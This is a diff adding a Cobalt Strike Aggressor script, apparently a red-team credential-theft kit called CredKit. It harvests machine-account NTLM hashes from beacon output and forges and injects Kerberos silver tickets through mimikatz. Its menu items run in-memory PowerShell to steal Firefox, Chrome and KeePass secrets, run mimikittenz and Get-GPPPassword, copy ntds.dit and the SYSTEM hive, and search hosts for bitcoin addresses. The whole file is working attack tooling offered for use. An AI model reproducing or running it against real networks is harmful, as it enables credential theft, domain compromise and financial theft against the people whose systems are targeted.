@@ -1,0 +1,179 @@
+
+
+%globalsettings['user'] = '';
+%globalsettings['domain'] = 'example.local';
+%globalsettings['domain-sid'] = 'S-1-5-21-000000000-1111111111-2222222222';
+%globalsettings['service'] = 'cifs';
+%globalsettings['purge'] = 'false';
+
+#silver ticket monitor - monitors beacon output and adds machine accounts to cred store
+on beacon_output {
+	if ($2 hasmatch 'Username : (.*\$).*[\n\r].*Domain   : (.*)[\n\r].*NTLM     : (.*)[\n\r]') {
+		local('$machineaccount $domain $machinehash');
+		$machineaccount = matched()[0];
+		$domain = matched()[1];
+		$machinehash = matched()[2];
+		credential_add($machineaccount,$machinehash,$domain,"Silver Ticket Monitor",binfo($1,"internal"));
+	}
+}
+
+
+sub silver-ticket {
+
+	@bids = $1;
+	@machinescompromised = @();
+
+	#make list of machine hashes compromised, place in array
+	foreach $entry (credentials()) {
+		if ($entry['user'] ismatch '(.*)\$') {
+			$temp = matched()[0] . " - $entry['password']";
+			if ($temp !in @machinescompromised) {
+				add(@machinescompromised, matched()[0] . " - $entry['password']");
+			}
+		}
+	}
+
+	$dialog = dialog("Silver Ticket", %(user => %globalsettings['user'], domain => %globalsettings['domain'], domain-sid => %globalsettings['domain-sid'], service => %globalsettings['service'], purge => %globalsettings['purge']), lambda({
+		#save configurations to global settings
+		%globalsettings['user'] = $3['user'];
+		%globalsettings['domain'] = $3['domain'];
+		%globalsettings['domain-sid'] = $3['domain-sid'];
+		%globalsettings['service'] = $3['service'];
+		%globalsettings['purge'] = $3['purge'];
+
+		foreach $bid (@bids){
+			if ($3['purge'] eq 'true') {
+				binput($bid,'mimikatz kerberos::purge');
+				bmimikatz($bid,'kerberos::purge');
+			}
+			$targethost = split(' - ',$3['target'])[0];
+			$targethash = split(' - ',$3['target'])[1];
+			$mimikatz_command = "kerberos::golden /user: $+ $3['user'] /domain: $+ $3['domain'] /sid: $+ $3['domain-sid'] /target: $+ $targethost $+ \. $+ $3['domain'] /rc4: $+ $targethash /service: $+ $3['service'] /ptt";
+			binput($bid,"mimikatz $mimikatz_command");
+			bmimikatz($bid,$mimikatz_command);
+		};
+		}));
+
+	dialog_description($dialog, "This dialog generates a silver ticket for the chosen service and injects it into the current session.");
+	
+	drow_text($dialog, "user",  "User:");
+	drow_text($dialog, "domain", "Domain FQDN:");
+	drow_text($dialog, "domain-sid", "Domain SID:");
+	drow_combobox($dialog, "target", "Target Host:", @machinescompromised);
+	drow_text($dialog, "service", "Service:");
+	drow_checkbox($dialog, "purge", "Purge Kerberos Tray First?");
+	dbutton_action($dialog, "Build");
+	
+	dialog_show($dialog);
+
+}
+
+
+
+popup beacon_bottom {
+	menu "CredKit" {
+		item "Get Firefox Passwords"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell-import Get-FirefoxPasswords.ps1");
+				# read in the powershell script
+				$handle = openf(script_resource("scripts/Get-FirefoxPasswords.ps1"));
+				$firefox_script = readb($handle, -1);
+				closef($handle);
+				# host firefox script on beacon
+				$cmd = beacon_host_script($1, $firefox_script);
+				binput($bid, "powershell Get-FirefoxPasswords");
+				sleep(5 * 1000);
+				# execute in-memory hosted script
+				bpowerpick($1, "$cmd");
+			}
+		}
+		item "Get Chrome Passwords"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell-import Get-ChromePasswords.ps1");
+				# read in the powershell script
+				$handle = openf(script_resource("scripts/Get-ChromePasswords.ps1"));
+				$chrome_script = readb($handle, -1);
+				closef($handle);
+				$cmd = beacon_host_script($bid, $chrome_script);
+				binput($bid, "powerpick Get-ChromePasswords");
+				sleep(50 * 1000);
+				# execute in-memory hosted script
+				bpowerpick($bid, "$cmd");
+			}
+		}
+		item "Find KeePass Config"{
+			local('$bid');
+			foreach $bid ($1) {
+				binput($1, "powershell-import KeePassConfig.ps1");
+				bpowershell_import($bid, script_resource("scripts/KeePassConfig.ps1"));
+				binput($bid, "powershell Find-KeePassconfig");
+				bpowershell($bid, "Find-KeePassconfig");
+			}
+		}
+		item "Get KeePass database master key"{
+			local('$bid');
+			foreach $bid ($1) {
+				binput($bid, "powershell-import KeeThief.ps1");
+				bpowershell_import($bid, script_resource("scripts/KeeThief.ps1"));
+				binput($bid, "powershell Get-KeePassDatabaseKey -Verbose");
+				bpowershell($bid, "Get-KeePassDatabaseKey -Verbose");
+			}
+		}
+		item "Invoke-mimikittenz"{
+			local('$bid');
+			foreach $bid ($1) {
+				binput($bid, "powershell-import Invoke-mimikittenz.ps1");
+				bpowershell_import($bid, script_resource("scripts/Invoke-mimikittenz.ps1"));
+				binput($bid, "powershell Invoke-mimikittenz");
+				bpowershell($bid, "Invoke-mimikittenz");
+			}
+		}
+
+	    item "Get GPP Password"{
+			local('$bid');
+			foreach $bid ($1) {
+				binput($bid, "powershell-import Get-GPPPassword.ps1");
+				bpowershell_import($bid, script_resource("scripts/Get-GPPPassword.ps1"));
+				binput($bid, "powershell Get-GPPPassword");
+				bpowerpick($bid, "Get-GPPPassword");
+			}
+		}
+
+
+ 		item "Extract NTDS.DIT"{
+			local('$bid');
+			foreach $bid ($1) {
+			bpowershell_import($1, script_resource("scripts/Invoke-NinjaCopy.ps1"));
+			bpowerpick($1, 'Invoke-NinjaCopy -Path "C:\Windows\ntds\ntds.dit" -LocalDestination "C:\Windows\temp\ntds.dit"');
+			bpowerpick($1, 'Invoke-NinjaCopy -Path "C:\Windows\system32\config\SYSTEM" -LocalDestination "C:\Windows\temp\SYSTEM"');
+			bshell($1, 'dir /a C:\Windows\temp\\');
+
+			}
+		}
+
+
+			
+
+
+
+
+
+	item "Silver Ticket" {
+		silver-ticket($1);
+	}
+
+	}
+}
+
+popup ssh {
+	menu "CredKit" {
+		item "Find bitcoin addresses"{
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, 'egrep "^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$" / -R 2>/dev/null');
+			}
+		}
+	}
+}
